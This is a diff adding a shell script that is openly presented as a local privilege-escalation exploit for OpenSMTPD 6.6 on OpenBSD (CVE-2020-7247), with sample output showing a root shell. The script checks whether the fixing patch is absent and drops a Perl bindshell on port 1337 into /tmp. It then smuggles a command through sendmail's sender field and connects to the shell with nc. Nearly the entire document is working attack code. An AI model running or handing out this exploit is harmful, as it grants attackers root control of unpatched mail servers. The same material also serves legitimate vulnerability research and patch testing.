@@ -1,0 +1,85 @@
+#!/bin/sh
+# root66 - OpenBSD 6.6 OpenSMTPD 6.6 local root exploit for CVE-2020-7247
+# starts a perl bindshell on port 1337 with root privileges
+#
+# Code mostly stolen from Qualys PoCs:
+# - https://www.openwall.com/lists/oss-security/2020/01/28/3
+# - https://blog.qualys.com/laws-of-vulnerabilities/2020/01/29/openbsd-opensmtpd-remote-code-execution-vulnerability-cve-2020-7247
+# - https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
+# ---
+# openbsd-6-6-x64$ ./root66
+# OpenBSD 6.6 OpenSMTPD 6.6 local root exploit (CVE-2020-7247)
+# [*] id: uid=1001(test) gid=1001(test) groups=1001(test)
+# [*] checking system ...
+# [*] directory /tmp/.payload is writable
+# [*] 019_smtpd_exec patch has not been installed
+# [*] writing payload to /tmp/.payload ...
+# [*] executing /tmp/.payload ...
+# <<< 220 openbsd-6-6-x64.localdomain ESMTP OpenSMTPD
+# >>> EHLO localhost
+# <<< 250-openbsd-6-6-x64.localdomain Hello localhost [local], pleased to meet you
+# <<< 250-8BITMIME
+# <<< 250-ENHANCEDSTATUSCODES
+# <<< 250-SIZE 36700160
+# <<< 250 HELP
+# >>> MAIL FROM:<;/tmp/.payload;#@>  
+# <<< 250 2.0.0 Ok
+# >>> RCPT TO:<test@openbsd-6-6-x64.localdomain> 
+# <<< 250 2.1.5 Destination address valid: Recipient ok
+# >>> DATA
+# <<< 354 Enter mail, end with "." on a line by itself
+# >>> .
+# <<< 250 2.0.0 9493d192 Message accepted for delivery
+# >>> QUIT
+# <<< 221 2.0.0 Bye
+# [*] cleaning up /tmp/.payload ...
+# [*] connecting to 127.0.0.1:1337 ...
+# Connection to 127.0.0.1 1337 port [tcp/*] succeeded!
+# id
+# uid=0(root) gid=0(wheel) groups=0(wheel)
+# uname -a
+# OpenBSD openbsd-6-6-x64.localdomain 6.6 GENERIC#353 amd64
+# ---
+# 2020-01-31 - <bcoles@gmail.com>
+# https://github.com/bcoles/local-exploits/tree/master/CVE-2020-7247
+
+payload="/tmp/.payload"
+
+/bin/echo "OpenBSD 6.6 OpenSMTPD 6.6 local root exploit (CVE-2020-7247)"
+
+/bin/echo "[*] id: `id`"
+
+/bin/echo "[*] checking system ..."
+
+if [ -w `dirname $payload` ]; then
+  /bin/echo "[*] directory $payload is writable"
+else
+  /bin/echo "[-] directory $payload is not writable"
+  exit 1
+fi
+
+if syspatch -l | grep -q 019_smtpd_exec ; then
+  /bin/echo "[-] 019_smtpd_exec patch has been installed"
+  exit 1
+else
+  /bin/echo "[*] 019_smtpd_exec patch has not been installed"
+fi
+
+/bin/echo "[*] writing payload to $payload ..."
+cat > $payload << "EOF"
+#!/bin/sh
+perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,1337,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'
+EOF
+/bin/chmod +x $payload
+
+/bin/echo "[*] executing $payload ..."
+/bin/echo | /usr/sbin/sendmail -v -f "<;$payload;#@>" `whoami`
+
+/bin/sleep 1
+
+/bin/echo "[*] cleaning up $payload ..."
+/bin/rm $payload
+
+/bin/echo "[*] connecting to 127.0.0.1:1337 ..."
+nc -v 127.0.0.1 1337
+
